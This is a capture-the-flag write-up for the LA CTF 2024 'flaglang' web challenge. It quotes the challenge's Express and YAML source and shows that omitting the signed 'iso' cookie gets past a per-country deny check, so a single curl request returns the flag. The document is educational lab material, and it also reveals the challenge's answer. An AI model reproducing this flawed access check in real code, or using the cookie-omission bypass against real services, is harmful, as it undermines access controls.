# flaglang

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 607 solves / 133 points
- Author: r2uwu2
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Do you speak the language of the flags?

[flaglang.chall.lac.tf](https://flaglang.chall.lac.tf)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219100458.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219100629.png)

In here, we can get the translated version of the word "Hello world" from English to many different languages:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219100756.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219101119.png)

When we selected a country, it'll send a GET request to `/view` with parameter name `country` and value `<your_selected_country>` asynchronously.

**By playing around, I found that there's a "country" called `Flagistan`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219100858.png)

**When I select that option, it just gave me the flag??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219100955.png)

Uhhh... Pretty sure its unintended?...

To figure out why, let's dive into the source code of this web application.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/web/flaglang/flaglang.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/flaglang)-[2024.02.19|10:13:45(HKT)]
└> file flaglang.zip    
flaglang.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/flaglang)-[2024.02.19|10:13:46(HKT)]
└> unzip flaglang.zip   
Archive:  flaglang.zip
  inflating: Dockerfile              
  inflating: package.json            
  inflating: package-lock.json       
   creating: src/
  inflating: src/index.html          
  inflating: src/app.js              
  inflating: src/countries.yaml      
   creating: src/assets/
  inflating: src/assets/style.css    
  inflating: src/assets/flag.js      
```

By viewing the source code, we can figure out how the application is working.

**`src/app.js`, GET method route `/`:**
```javascript
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const express = require('express');
const cookieParser = require('cookie-parser');
const yaml = require('yaml');

const yamlPath = path.join(__dirname, 'countries.yaml');
const countryData = yaml.parse(fs.readFileSync(yamlPath).toString());
const countries = new Set(Object.keys(countryData));
const countryList = JSON.stringify(btoa(JSON.stringify(Object.keys(countryData))));

const isoLookup = Object.fromEntries([...countries].map(name => [
  countryData[name].iso,
  {...countryData[name], name }
]));
[...]
app.get('/', (req, res) => {
  const template = fs.readFileSync(path.join(__dirname, 'index.html')).toString();
  const iso = req.signedCookies.iso || 'US';
  const country = isoLookup[iso];
  res
    .status(200)
    .type('html')
    .send(template
      .replaceAll('$msg$', country.msg)
      .replaceAll('$name$', country.name)
      .replaceAll('$iso$', country.iso)
      .replaceAll('$countries$', countryList)
    );
});
[...]
```

In this route, it'll lookup the country code (ISO 3166-1) based on our cookie name `iso`'s value. If there's no cookie named `iso`, it'll just use `US` by default.

**The `countryData` YAML data can be read on `src/countries.yaml`:**
```yaml
%YAML 1.1
---
Flagistan:
  iso: FL
  msg: "<REDACTED>"
  password: "<REDACTED>"
  deny: 
    ["AF","AX","AL","DZ","AS","AD","AO","AI","AQ","AG","AR","AM","AW","AU","AT","AZ","BS","BH","BD","BB","BY","BE","BZ","BJ","BM","BT","BO","BA","BW","BV","BR","IO","BN","BG","BF","BI","KH","CM","CA","CV","KY","CF","TD","CL","CN","CX","CC","CO","KM","CG","CD","CK","CR","CI","HR","CU","CY","CZ","DK","DJ","DM","DO","EC","EG","SV","GQ","ER","EE","ET","FK","FO","FJ","FI","FR","GF","PF","TF","GA","GM","GE","DE","GH","GI","GR","GL","GD","GP","GU","GT","GG","GN","GW","GY","HT","HM","VA","HN","HK","HU","IS","IN","ID","IR","IQ","IE","IM","IL","IT","JM","JP","JE","JO","KZ","KE","KI","KR","KP","KW","KG","LA","LV","LB","LS","LR","LY","LI","LT","LU","MO","MK","MG","MW","MY","MV","ML","MT","MH","MQ","MR","MU","YT","MX","FM","MD","MC","MN","ME","MS","MA","MZ","MM","NA","NR","NP","NL","AN","NC","NZ","NI","NE","NG","NU","NF","MP","NO","OM","PK","PW","PS","PA","PG","PY","PE","PH","PN","PL","PT","PR","QA","RE","RO","RU","RW","BL","SH","KN","LC","MF","PM","VC","WS","SM","ST","SA","SN","RS","SC","SL","SG","SK","SI","SB","SO","ZA","GS","ES","LK","SD","SR","SJ","SZ","SE","CH","SY","TW","TJ","TZ","TH","TL","TG","TK","TO","TT","TN","TR","TM","TC","TV","UG","UA","AE","GB","US","UM","UY","UZ","VU","VE","VN","VG","VI","WF","EH","YE","ZM","ZW"]

# i love chatgpt translation :3
Afghanistan:
  iso: AF
  msg: سلام دنیا
  deny: []
[...]
```

As you can see, there's a country called `Flagistan`, and its ISO is `FL`. **Also, the `msg` and `password` is `<REDACTED>`? Maybe they contains the real flag??**

Hmm... But there's a deny list for all countries ISO? What's that?

**`src/app.js`, GET method route `/view`:**
```javascript
app.get('/view', (req, res) => {
  if (!req.query.country) {
    res.status(400).json({ err: 'please give a country' });
    return;
  }
  if (!countries.has(req.query.country)) {
    res.status(400).json({ err: 'please give a valid country' });
    return;
  }
  const country = countryData[req.query.country];
  const userISO = req.signedCookies.iso;
  if (country.deny.includes(userISO)) {
    res.status(400).json({ err: `${req.query.country} has an embargo on your country` });
    return;
  }
  res.status(200).json({ msg: country.msg, iso: country.iso });
});
```

In this route, when GET parameter `country` is provided and is a valid country, it'll return the `countryData` object's `msg` and `iso` attribute.

However, there's a caveat. **When our cookie `iso` is in the country's deny list**, it'll return `<country_name> has an embargo on your country`. Otherwise, return the country's `msg` and `iso`.

Ahh, I see what's that `deny` list in the YAML file.

## Exploitation

So, to get the flag, we can just **send a GET request to `/view` with parameter `country=Flagistan` without any cookies**.

In my case, when I first explore the web application, **there's no cookies have been set**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219103523.png)

Which is very weird, the `iso` cookie should be set when I first visited the index page (`/`).

**Anyway, based on the information in above, we can get the flag!**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/flaglang)-[2024.02.19|10:14:10(HKT)]
└> curl https://flaglang.chall.lac.tf/view?country=Flagistan
{"msg":"lactf{n0rw3g7an_y4m7_f4ns_7n_sh4mbl3s}","iso":"FL"}
```

(Get the flag in a beautiful way using `jq`):

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/flaglang)-[2024.02.19|10:37:29(HKT)]
└> curl -s https://flaglang.chall.lac.tf/view?country=Flagistan | jq -r '.msg'
lactf{n0rw3g7an_y4m7_f4ns_7n_sh4mbl3s}
```

- **Flag: `lactf{n0rw3g7an_y4m7_f4ns_7n_sh4mbl3s}`**

## Conclusion

What we've learned:

1. Bypassing restriction with no cookies